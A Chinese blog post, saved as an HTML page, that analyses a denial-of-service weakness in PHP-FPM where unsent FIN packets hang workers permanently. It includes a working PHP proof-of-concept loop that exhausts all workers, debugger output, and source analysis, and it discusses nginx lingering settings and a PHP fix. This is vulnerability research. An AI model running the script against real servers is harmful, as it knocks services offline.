@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>make-service-unavailable-by-fin-loss-attack</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="lihongbin">
+
+    <!-- Le styles -->
+    <link rel="stylesheet" href="/theme/css/bootstrap.min.css" type="text/css" />
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+      .sidebar-nav {
+        padding: 9px 0;
+      }
+      .tag-1 {
+        font-size: 13pt;
+      }
+      .tag-2 {
+        font-size: 10pt;
+      }
+      .tag-2 {
+        font-size: 8pt;
+      }
+      .tag-4 {
+        font-size: 6pt;
+     }
+    </style>
+    <link href="/theme/css/bootstrap-responsive.min.css" rel="stylesheet">
+        <link href="/theme/css/font-awesome.css" rel="stylesheet">
+
+    <link href="/theme/css/pygments.css" rel="stylesheet">
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <!-- Le fav and touch icons -->
+    <link rel="shortcut icon" href="/theme/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/theme/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/theme/images/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/theme/images/apple-touch-icon-114x114.png">
+
+    <link href="/" type="application/atom+xml" rel="alternate" title="redfox ATOM Feed" />
+
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-fluid">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="/index.html">redfox </a>
+          <div class="nav-collapse">
+            <ul class="nav">
+                          <li class="divider-vertical"></li>
+                  <li class="active">
+                    <a href="/category/php.html">
+						<i class="icon-folder-open icon-large"></i>php
+					</a>
+                  </li>
+
+                          <ul class="nav pull-right">
+                                <li><a href="/archives.html"><i class="icon-th-list"></i>Archives</a></li>
+                          </ul>
+
+            </ul>
+            <!--<p class="navbar-text pull-right">Logged in as <a href="#">username</a></p>-->
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="span12" id="content">
+<section id="content">
+        <article>
+                <header>
+                        <h1>
+                                <a href=""
+                                        rel="bookmark"
+                                        title="Permalink to make-service-unavailable-by-fin-loss-attack">
+                                        make-service-unavailable-by-fin-loss-attack
+                                </a>
+                        </h1>
+                </header>
+                <div class="entry-content">
+                <div class="well">
+<footer class="post-info">
+<span class="label">Date</span>
+<abbr class="published" title="2014-12-16T18:32:12">
+        <i class="icon-calendar"></i>Tue 16 December 2014
+</abbr>
+<span class="label">By</span>
+<a href="/author/lihongbin.html"><i class="icon-user"></i>lihongbin</a>
+<span class="label">Category</span>
+<a href="/category/php.html"><i class="icon-folder-open"></i>php</a>.
+
+
+<span class="label">Tags</span>
+	<a href="/tag/all.html"><i class="icon-tag"></i>all</a>
+	<a href="/tag/security.html"><i class="icon-tag"></i>security</a>
+</footer><!-- /.post-info -->                </div>
+                <div class="contents topic" id="table-of-contents">
+<p class="topic-title first">Table of Contents</p>
+<ul class="auto-toc simple">
+<li><a class="reference internal" href="#id1" id="id8">1&nbsp;&nbsp;&nbsp;问题</a></li>
+<li><a class="reference internal" href="#id2" id="id9">2&nbsp;&nbsp;&nbsp;做法</a><ul class="auto-toc">
+<li><a class="reference internal" href="#id3" id="id10">2.1&nbsp;&nbsp;&nbsp;思路</a></li>
+<li><a class="reference internal" href="#demo-code" id="id11">2.2&nbsp;&nbsp;&nbsp;demo-code</a></li>
+<li><a class="reference internal" href="#id4" id="id12">2.3&nbsp;&nbsp;&nbsp;测试结果</a></li>
+<li><a class="reference internal" href="#id5" id="id13">2.4&nbsp;&nbsp;&nbsp;网络交互流程图</a></li>
+<li><a class="reference internal" href="#refer-code" id="id14">2.5&nbsp;&nbsp;&nbsp;refer code</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#request-terminate-timeout" id="id15">3&nbsp;&nbsp;&nbsp;request_terminate_timeout能解决问题?</a></li>
+<li><a class="reference internal" href="#nginx" id="id16">4&nbsp;&nbsp;&nbsp;nginx的解决办法</a><ul class="auto-toc">
+<li><a class="reference internal" href="#lingering-close" id="id17">4.1&nbsp;&nbsp;&nbsp;lingering_close</a></li>
+<li><a class="reference internal" href="#lingering-time" id="id18">4.2&nbsp;&nbsp;&nbsp;lingering_time</a></li>
+<li><a class="reference internal" href="#lingering-timeout" id="id19">4.3&nbsp;&nbsp;&nbsp;lingering_timeout</a></li>
+<li><a class="reference internal" href="#id6" id="id20">4.4&nbsp;&nbsp;&nbsp;refer code</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#php" id="id21">5&nbsp;&nbsp;&nbsp;php的解决办法</a><ul class="auto-toc">
+<li><a class="reference internal" href="#id7" id="id22">5.1&nbsp;&nbsp;&nbsp;思路</a></li>
+<li><a class="reference internal" href="#refer-core-code" id="id23">5.2&nbsp;&nbsp;&nbsp;refer core code</a></li>
+<li><a class="reference internal" href="#githubpr" id="id24">5.3&nbsp;&nbsp;&nbsp;github上的PR</a></li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="section" id="id1">
+<h2><a class="toc-backref" href="#id8">1&nbsp;&nbsp;&nbsp;问题</a></h2>
+<p>给你一个php server的ip&amp;&amp;port，如何使它不可服务？</p>
+<p><strong>PS1:: 这个攻击问题实际上是没有意义的，因为php一般是不对外开放的，只是讨论而已</strong></p>
+<p>PS2:: <tt class="docutils literal"><span class="pre">不过在实际环境中，如果持续性的fin包丢失，的确也是会产生服务不可用的问题(至少我们线上已经出现过每天丢一部分的fin包了-_-||)</span></tt></p>
+<p>PS3:: <tt class="docutils literal">php因为fin包丢失而永久hang住的问题是存在的，只是fin包是如何丢失的，又是另外一个问题了</tt></p>
+</div>
+<div class="section" id="id2">
+<h2><a class="toc-backref" href="#id9">2&nbsp;&nbsp;&nbsp;做法</a></h2>
+<div class="section" id="id3">
+<h3><a class="toc-backref" href="#id10">2.1&nbsp;&nbsp;&nbsp;思路</a></h3>
+<p><strong>利用现有php源码的缺陷</strong></p>
+<p><strong>php-cgi worker里的fd都是堵塞的，同时不设置读写超时，而且还在代码里写了一个死循环接受最后的fin包</strong></p>
+<p>于是可以根据fast-cgi协议，构造一个请求，最后不关闭socket，这样就可以使php-cgi 的一个worker hang住</p>
+<p>持续性这样的请求，使所有的worker都hang住，这样server就不可用了</p>
+</div>
+<div class="section" id="demo-code">
+<h3><a class="toc-backref" href="#id11">2.2&nbsp;&nbsp;&nbsp;demo-code</a></h3>
+<div class="highlight"><pre><span class="cp">&lt;?php</span>
+<span class="k">require_once</span> <span class="s2">&quot;./lib/fastcgipro.php&quot;</span><span class="p">;</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;FCGI_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;FCGI_PORT&#39;</span><span class="p">,</span> <span class="mi">19550</span><span class="p">);</span>
+
+<span class="nx">make_hang_main</span><span class="p">();</span>
+
+<span class="k">function</span> <span class="nf">make_hang_main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$cnt</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">;</span><span class="o">++</span><span class="nv">$cnt</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$socket</span><span class="p">[</span><span class="nv">$cnt</span><span class="p">]</span> <span class="o">=</span> <span class="nb">socket_create</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span>
+        <span class="nb">socket_connect</span><span class="p">(</span><span class="nv">$socket</span><span class="p">[</span><span class="nv">$cnt</span><span class="p">],</span> <span class="nx">FCGI_HOST</span><span class="p">,</span> <span class="nx">FCGI_PORT</span><span class="p">);</span>
+
+        <span class="nv">$content_body</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="nv">$fcgi_request_id</span> <span class="o">=</span> <span class="nv">$cnt</span><span class="p">;</span>
+        <span class="nv">$env</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+            <span class="s1">&#39;SCRIPT_FILENAME&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/home/file_not_exist.php&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;REQUEST_METHOD&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;CONTENT_LENGTH&#39;</span> <span class="o">=&gt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$content_body</span><span class="p">),</span>
+        <span class="p">);</span>
+
+        <span class="nx">send_request</span><span class="p">(</span><span class="nv">$socket</span><span class="p">[</span><span class="nv">$cnt</span><span class="p">],</span> <span class="nv">$content_body</span><span class="p">,</span> <span class="nv">$env</span><span class="p">,</span> <span class="nv">$fcgi_request_id</span><span class="p">);</span>
+        <span class="nv">$result</span> <span class="o">=</span> <span class="nx">get_response</span><span class="p">(</span><span class="nv">$socket</span><span class="p">[</span><span class="nv">$cnt</span><span class="p">]);</span>
+        <span class="k">echo</span> <span class="s2">&quot;***************</span><span class="si">$cnt</span><span class="s2">*****************</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+        <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+        <span class="c1">//socket_close($socket[$cnt]);//we don&#39;t send FIN to server</span>
+    <span class="p">}</span>
+
+    <span class="c1">//can&#39;t run here</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="nv">$cnt</span><span class="p">;</span> <span class="o">++</span><span class="nv">$i</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nb">socket_close</span><span class="p">(</span><span class="nv">$socket</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<div class="section" id="id4">
+<h3><a class="toc-backref" href="#id12">2.3&nbsp;&nbsp;&nbsp;测试结果</a></h3>
+<p>在fpm里设置max_children为10，那么发完10个请求后，第11个请求就会一直hang在那里，整个server处于无法服务的状态</p>
+<p>随便gbd一个worker的进程，可以看到hang在接受网络数据的地方:</p>
+<pre class="literal-block">
+(gdb) bt
+#0  0x0000003f0b90b4e4 in recv () from /lib64/tls/libpthread.so.0
+#1  0x000000000098ed78 in fcgi_close (req=0x7fffa8c58ad0, force=0, destroy=1) at /home/users/lihongbin/git/php-src/sapi/fpm/fpm/fastcgi.c:763
+#2  0x000000000098f82d in fcgi_finish_request (req=0x7fffa8c58ad0, force_close=0) at /home/users/lihongbin/git/php-src/sapi/fpm/fpm/fastcgi.c:1081
+#3  0x0000000000999f55 in sapi_cgi_deactivate () at /home/users/lihongbin/git/php-src/sapi/fpm/fpm/fpm_main.c:847
+#4  0x0000000000871a9b in sapi_deactivate () at /home/users/lihongbin/git/php-src/main/SAPI.c:536
+#5  0x0000000000866580 in php_request_shutdown (dummy=0x0) at /home/users/lihongbin/git/php-src/main/main.c:1817
+#6  0x000000000099c317 in main (argc=7, argv=0x7fffa8c5acb8) at /home/users/lihongbin/git/php-src/sapi/fpm/fpm/fpm_main.c:1981
+</pre>
+</div>
+<div class="section" id="id5">
+<h3><a class="toc-backref" href="#id13">2.4&nbsp;&nbsp;&nbsp;网络交互流程图</a></h3>
+<p>TCP四次分手流程图:</p>
+<pre class="literal-block">
+client                       php-cgi
+    |                            |
+    |       FIN                  |shutdown(req-&gt;fd, 1)
+    | &lt;------------------------- |       ||
+    |       ACK                  |       ||
+    | -------------------------&gt; |       \/
+    |      FIN                   |while(recv(req-&gt;fd), buf, sizeof(buf), 0) &gt; 0) =&gt; wait FIN
+    | -------------------------&gt; |
+    |      ACK                   |
+    | &lt;------------------------- |
+    |                            |
+    |                            |
+</pre>
+</div>
+<div class="section" id="refer-code">
+<h3><a class="toc-backref" href="#id14">2.5&nbsp;&nbsp;&nbsp;refer code</a></h3>
+<div class="highlight"><pre><span class="c1">//sapi/fpm/fpm/fastcgi.c</span>
+<span class="kt">void</span> <span class="nf">fcgi_close</span><span class="p">(</span><span class="n">fcgi_request</span> <span class="o">*</span><span class="n">req</span><span class="p">,</span> <span class="kt">int</span> <span class="n">force</span><span class="p">,</span> <span class="kt">int</span> <span class="n">destroy</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">//................</span>
+
+    <span class="k">if</span> <span class="p">((</span><span class="n">force</span> <span class="o">||</span> <span class="o">!</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">keep</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<span class="cp">#ifdef _WIN32</span>
+    <span class="c1">//.................</span>
+            <span class="n">shutdown</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="k">while</span> <span class="p">(</span><span class="n">recv</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{}</span><span class="c1">//hang here if client don&#39;t send the pack of fin</span>
+    <span class="c1">//................</span>
+<span class="cp">#else</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">force</span><span class="p">)</span> <span class="p">{</span><span class="c1">//fcgi_finish_request -&gt; fcgi_close的时候，参数force写死了为0，必然走到这里</span>
+            <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+
+            <span class="n">shutdown</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="k">while</span> <span class="p">(</span><span class="n">recv</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{}</span><span class="c1">//hang here if client don&#39;t send the pack of fin</span>
+        <span class="p">}</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>
+<span class="cp">#endif</span>
+        <span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="n">fpm_request_finished</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="request-terminate-timeout">
+<h2><a class="toc-backref" href="#id15">3&nbsp;&nbsp;&nbsp;request_terminate_timeout能解决问题?</a></h2>
+<p>在fpm的配置里有一个request_terminate_timeout配置项，从外围来监控进程的运行时间，这个选项能解决问题？</p>
+<p><strong>很遗憾，在目前的代码里是没有办法的，具体来看代码</strong></p>
+<p>先来看worker的处理流程代码</p>
+<div class="highlight"><pre><span class="c1">//sapi/fpm/fpm/fpm_main.c</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="c1">//..............</span>
+    <span class="n">fcgi_fd</span> <span class="o">=</span> <span class="n">fpm_run</span><span class="p">(</span><span class="o">&amp;</span><span class="n">max_requests</span><span class="p">);</span><span class="c1">//如果是fpm的mater进程，则一直在fpm_run里监控各种事件，下面的代码是worker运行的</span>
+    <span class="c1">//.................</span>
+    <span class="n">zend_first_try</span> <span class="p">{</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">fcgi_accept_request</span><span class="p">(</span><span class="o">&amp;</span><span class="n">request</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">//................</span>
+
+            <span class="n">fpm_request_info</span><span class="p">();</span>
+
+            <span class="c1">//...........</span>
+
+            <span class="n">fpm_request_executing</span><span class="p">();</span>
+
+            <span class="n">php_execute_script</span><span class="p">(</span><span class="o">&amp;</span><span class="n">file_handle</span> <span class="n">TSRMLS_CC</span><span class="p">);</span>
+
+            <span class="c1">//............</span>
+            <span class="n">fpm_request_end</span><span class="p">(</span><span class="n">TSRMLS_C</span><span class="p">);</span><span class="c1">//将request_stage 设置为 FPM_REQUEST_FINISHED</span>
+            <span class="n">fpm_log_write</span><span class="p">(</span><span class="nb">NULL</span> <span class="n">TSRMLS_CC</span><span class="p">);</span>
+
+            <span class="n">STR_FREE</span><span class="p">(</span><span class="n">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">path_translated</span><span class="p">);</span>
+            <span class="n">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">path_translated</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+            <span class="n">php_request_shutdown</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//php_request_shutdown -&gt; sapi_deactivate -&gt; sapi_cgi_deactivate -&gt; fcgi_finish_request -&gt; fcgi_close</span>
+                                             <span class="c1">//在上面贴的fcgi_close函数里接收client最后的数据</span>
+
+            <span class="n">requests</span><span class="o">++</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">max_requests</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">requests</span> <span class="o">==</span> <span class="n">max_requests</span><span class="p">))</span> <span class="p">{</span>
+                <span class="n">fcgi_finish_request</span><span class="p">(</span><span class="o">&amp;</span><span class="n">request</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="cm">/* end of fastcgi loop */</span>
+        <span class="p">}</span>
+        <span class="c1">//..................</span>
+    <span class="p">}</span> <span class="n">zend_catch</span> <span class="p">{</span>
+        <span class="n">exit_status</span> <span class="o">=</span> <span class="n">FPM_EXIT_SOFTWARE</span><span class="p">;</span>
+    <span class="p">}</span> <span class="n">zend_end_try</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></div>
+<p>再看fpm控制worker进程的处理代码</p>
+<p>fpm的master进程有一个心跳监控机制，隔某个时间点(最多1秒)看一下每个worker是否超过执行时间了，如果超过，则kill该worker，重新生成一个worker接收请求</p>
+<p>PS:后续再搞一个文章介绍一下fpm的运行机制</p>
+<p>fpm基本的流程:</p>
+<pre class="literal-block">
+main -&gt; fpm_run -&gt; fpm_event_loop -&gt; fpm_pctl_heartbeat -&gt; fpm_pctl_check_request_timeout -&gt; fpm_request_check_timed_out
+</pre>
+<p>来详细看看fpm_request_check_timed_out函数</p>
+<div class="highlight"><pre><span class="c1">//sapi/fpm/fpm/fpm_request.c</span>
+<span class="kt">void</span> <span class="nf">fpm_request_check_timed_out</span><span class="p">(</span><span class="k">struct</span> <span class="n">fpm_child_s</span> <span class="o">*</span><span class="n">child</span><span class="p">,</span> <span class="k">struct</span> <span class="n">timeval</span> <span class="o">*</span><span class="n">now</span><span class="p">,</span> <span class="kt">int</span> <span class="n">terminate_timeout</span><span class="p">,</span> <span class="kt">int</span> <span class="n">slowlog_timeout</span><span class="p">)</span> <span class="cm">/* {{{ */</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">fpm_scoreboard_proc_s</span> <span class="n">proc</span><span class="p">,</span> <span class="o">*</span><span class="n">proc_p</span><span class="p">;</span>
+
+    <span class="n">proc_p</span> <span class="o">=</span> <span class="n">fpm_scoreboard_proc_acquire</span><span class="p">(</span><span class="n">child</span><span class="o">-&gt;</span><span class="n">wp</span><span class="o">-&gt;</span><span class="n">scoreboard</span><span class="p">,</span> <span class="n">child</span><span class="o">-&gt;</span><span class="n">scoreboard_i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">proc_p</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">zlog</span><span class="p">(</span><span class="n">ZLOG_WARNING</span><span class="p">,</span> <span class="s">&quot;failed to acquire scoreboard&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">proc</span> <span class="o">=</span> <span class="o">*</span><span class="n">proc_p</span><span class="p">;</span>
+    <span class="n">fpm_scoreboard_proc_release</span><span class="p">(</span><span class="n">proc_p</span><span class="p">);</span>
+
+    <span class="c1">//.........................</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="n">request_stage</span> <span class="o">&gt;</span> <span class="n">FPM_REQUEST_ACCEPTING</span> <span class="o">&amp;&amp;</span> <span class="n">proc</span><span class="p">.</span><span class="n">request_stage</span> <span class="o">&lt;</span> <span class="n">FPM_REQUEST_END</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//注意这里 ~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+    <span class="c1">//之前已经将 request_stage 设置为 FPM_REQUEST_FINISHED， 而 FPM_REQUEST_FINISHED 大于 FPM_REQUEST_END</span>
+    <span class="c1">//所以在fcgi_close里读client端无用数据的时候，是没有办法走到下面的分支里的，也就无法kill掉执行超时的worker，这个worker会一直hang在那里</span>
+
+        <span class="kt">char</span> <span class="n">purified_script_filename</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="n">script_filename</span><span class="p">)];</span>
+        <span class="k">struct</span> <span class="n">timeval</span> <span class="n">tv</span><span class="p">;</span>
+
+        <span class="n">timersub</span><span class="p">(</span><span class="n">now</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">proc</span><span class="p">.</span><span class="n">accepted</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tv</span><span class="p">);</span>
+
+        <span class="c1">//.................</span>
+        <span class="c1">// slow log</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">terminate_timeout</span> <span class="o">&amp;&amp;</span> <span class="n">tv</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">&gt;=</span> <span class="n">terminate_timeout</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">str_purify_filename</span><span class="p">(</span><span class="n">purified_script_filename</span><span class="p">,</span> <span class="n">proc</span><span class="p">.</span><span class="n">script_filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="n">script_filename</span><span class="p">));</span>
+            <span class="n">fpm_pctl_kill</span><span class="p">(</span><span class="n">child</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="n">FPM_PCTL_TERM</span><span class="p">);</span>
+
+            <span class="n">zlog</span><span class="p">(</span><span class="n">ZLOG_WARNING</span><span class="p">,</span> <span class="s">&quot;[pool %s] child %d, script &#39;%s&#39; (request: </span><span class="se">\&quot;</span><span class="s">%s %s</span><span class="se">\&quot;</span><span class="s">) execution timed out (%d.%06d sec), terminating&quot;</span><span class="p">,</span>
+                <span class="n">child</span><span class="o">-&gt;</span><span class="n">wp</span><span class="o">-&gt;</span><span class="n">config</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">child</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="n">purified_script_filename</span><span class="p">,</span> <span class="n">proc</span><span class="p">.</span><span class="n">request_method</span><span class="p">,</span> <span class="n">proc</span><span class="p">.</span><span class="n">request_uri</span><span class="p">,</span>
+                <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">tv</span><span class="p">.</span><span class="n">tv_sec</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">tv</span><span class="p">.</span><span class="n">tv_usec</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<div class="section" id="nginx">
+<h2><a class="toc-backref" href="#id16">4&nbsp;&nbsp;&nbsp;nginx的解决办法</a></h2>
+<p>其实nginx也会遇到这种情况，在我们线上已经发生过了，不过ningx处理的不错</p>
+<p>nginx 有lingering机制解决这种case，具体有三个相关参数</p>
+<div class="section" id="lingering-close">
+<h3><a class="toc-backref" href="#id17">4.1&nbsp;&nbsp;&nbsp;lingering_close</a></h3>
+<p>lingering_close 表示当server 关闭socket的写时候，是否需要继续从client端来接收额外的数据</p>
+<ul class="simple">
+<li>中文版: <a class="reference external" href="http://nginx.org/cn/docs/http/ngx_http_core_module.html#lingering_close">http://nginx.org/cn/docs/http/ngx_http_core_module.html#lingering_close</a></li>
+<li>英文版: <a class="reference external" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#lingering_close">http://nginx.org/en/docs/http/ngx_http_core_module.html#lingering_close</a></li>
+</ul>
+</div>
+<div class="section" id="lingering-time">
+<h3><a class="toc-backref" href="#id18">4.2&nbsp;&nbsp;&nbsp;lingering_time</a></h3>
+<p>lingering_time 表示当lingering_close生效的时候，即继续接受数据的时候，接受数据的超时时间</p>
+<ul class="simple">
+<li>中文版: <a class="reference external" href="http://nginx.org/cn/docs/http/ngx_http_core_module.html#lingering_time">http://nginx.org/cn/docs/http/ngx_http_core_module.html#lingering_time</a></li>
+<li>英文版: <a class="reference external" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#lingering_time">http://nginx.org/en/docs/http/ngx_http_core_module.html#lingering_time</a></li>
+</ul>
+</div>
+<div class="section" id="lingering-timeout">
+<h3><a class="toc-backref" href="#id19">4.3&nbsp;&nbsp;&nbsp;lingering_timeout</a></h3>
+<p>在lingering_timeout内必须有数据，否则停止接收数据，一种idle time超时机制</p>
+<ul class="simple">
+<li>中文版: <a class="reference external" href="http://nginx.org/cn/docs/http/ngx_http_core_module.html#lingering_timeout">http://nginx.org/cn/docs/http/ngx_http_core_module.html#lingering_timeout</a></li>
+<li>英文版: <a class="reference external" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#lingering_timeout">http://nginx.org/en/docs/http/ngx_http_core_module.html#lingering_timeout</a></li>
+</ul>
+</div>
+<div class="section" id="id6">
+<h3><a class="toc-backref" href="#id20">4.4&nbsp;&nbsp;&nbsp;refer code</a></h3>
+<div class="highlight"><pre><span class="k">static</span> <span class="kt">void</span> <span class="nf">ngx_http_set_lingering_close</span><span class="p">(</span><span class="kt">ngx_http_request_t</span> <span class="o">*</span><span class="n">r</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">ngx_event_t</span>               <span class="o">*</span><span class="n">rev</span><span class="p">,</span> <span class="o">*</span><span class="n">wev</span><span class="p">;</span>
+    <span class="kt">ngx_connection_t</span>          <span class="o">*</span><span class="n">c</span><span class="p">;</span>
+    <span class="kt">ngx_http_core_loc_conf_t</span>  <span class="o">*</span><span class="n">clcf</span><span class="p">;</span>
+
+    <span class="n">c</span> <span class="o">=</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">connection</span><span class="p">;</span>
+
+    <span class="n">clcf</span> <span class="o">=</span> <span class="n">ngx_http_get_module_loc_conf</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">ngx_http_core_module</span><span class="p">);</span>
+
+    <span class="n">rev</span> <span class="o">=</span> <span class="n">c</span><span class="o">-&gt;</span><span class="n">read</span><span class="p">;</span>
+    <span class="n">rev</span><span class="o">-&gt;</span><span class="n">handler</span> <span class="o">=</span> <span class="n">ngx_http_lingering_close_handler</span><span class="p">;</span><span class="c1">//set lingering_timeout handler</span>
+
+    <span class="n">r</span><span class="o">-&gt;</span><span class="n">lingering_time</span> <span class="o">=</span> <span class="n">ngx_time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="kt">time_t</span><span class="p">)</span> <span class="p">(</span><span class="n">clcf</span><span class="o">-&gt;</span><span class="n">lingering_time</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">);</span><span class="c1">//set lingering_time</span>
+    <span class="n">ngx_add_timer</span><span class="p">(</span><span class="n">rev</span><span class="p">,</span> <span class="n">clcf</span><span class="o">-&gt;</span><span class="n">lingering_timeout</span><span class="p">);</span><span class="c1">//set lingering_timeout timer</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">ngx_handle_read_event</span><span class="p">(</span><span class="n">rev</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="n">NGX_OK</span><span class="p">)</span> <span class="p">{</span>
